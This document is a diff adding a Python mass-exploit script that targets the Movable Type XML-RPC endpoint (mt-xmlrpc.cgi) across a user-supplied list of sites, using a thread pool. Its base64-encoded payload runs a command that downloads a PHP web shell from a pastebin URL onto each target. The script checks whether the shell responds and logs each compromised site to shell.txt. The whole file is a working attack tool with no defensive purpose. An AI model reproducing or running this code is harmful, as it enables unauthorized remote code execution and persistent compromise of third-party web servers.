@@ -1,0 +1,79 @@
+# -*- coding: utf-8 -*-
+#!usr/bin/python
+import glob
+import os, sys, requests
+from colorama import Fore, Style
+from multiprocessing import Pool
+from multiprocessing.dummy import Pool as ThreadPool
+import urllib3
+import signal
+import time
+from platform import system	
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from pyfiglet import Figlet
+custom_fig = Figlet(font='standard')
+
+def banners():
+
+
+	if system() == 'Linux':
+		os.system('clear')
+	if system() == 'Windows':
+		os.system('cls')
+		
+
+banners()
+
+key = input("Key : ")
+if key == "ac5e1deef70affecaf0bcb791eea7d8c":
+  print("Key Valid")
+else:
+  exit("Key Invalid")
+
+def sigint_handler(signum, frame):
+    sys.exit(0)
+signal.signal(signal.SIGINT, sigint_handler)
+print(f"""
+{Fore.GREEN}
+   ******    ********  **       ********        
+  **////**  **//////**/**      /**/////         
+ **    //  **      // /**      /**       **   **
+/**       /**         /**      /******* //** ** 
+/**       /**    *****/**      /**////   //***  {Fore.RED}
+//**    **//**  ////**/**      /**        **/** 
+ //******  //******** /**      /******** ** //**
+  //////    ////////  //       //////// //   // 
+
+  {Fore.YELLOW}CGI Exploit
+  {Fore.BLUE}By xaighost PT.Bot Jaya Abadi
+  {Fore.CYAN}Author : @Karma_Reall
+
+  """)
+def cgi(url):
+  if '://' in url:
+    pass
+  else:
+    url = 'http://' + url + '/'
+  try:
+    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36","Connection":"close","Accept":"*/*","Content-Type":"text/xml"}
+    paramsPost = """<?xml version="1.0"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>YHdnZXQgaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3luQzhxaTVTIC1PIERJWi5waHBg</base64></value></param></params></methodCall>"""
+    requests.post(url+'/mt/mt-xmlrpc.cgi', headers=headers, data=paramsPost, timeout=10, verify=False)
+    checkvuln = requests.get(url+'/mt/DIZ.php')
+    checkshell = requests.get(url+'/DKIZ.php?DKIZ')
+    if 'Dit me may' in str(checkshell.content):
+        print(f"{Fore.GREEN}[Good]{Style.RESET_ALL} {url} {Fore.GREEN} => Succesed Upload Shell{Style.RESET_ALL}")
+        open('shell.txt', 'a').write(url+'DKIZ.php?DKIZ''\n')
+    else:
+        print(f"{Fore.RED}[Bad]{Style.RESET_ALL} {url} {Fore.RED} => Failed Exploit{Style.RESET_ALL}")
+  except:
+    pass
+url = open(input('List site : '),'r').read().split()
+Thread = input('Threads : ')
+pool = ThreadPool(int(Thread))
+pool.map(cgi, url)
+pool.close()
+pool.join()
+
+
